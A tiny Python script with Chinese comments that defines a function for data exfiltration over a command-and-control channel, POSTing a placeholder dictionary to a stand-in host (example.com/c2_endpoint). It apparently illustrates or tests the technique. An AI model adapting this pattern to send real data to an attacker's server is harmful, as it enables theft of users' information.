import requests

def exfiltration_over_c2(data):
    c2_url = "http://example.com/c2_endpoint"

    # 發送 POST 請求
    response = requests.post(c2_url, data=data)

    # 檢查回應狀態碼
    if response.status_code == 200:
        print("Data successfully exfiltrated over C2 channel.")
    else:
        print("Exfiltration failed.")

# 測試範例
data = {"key": "value"}
exfiltration_over_c2(data)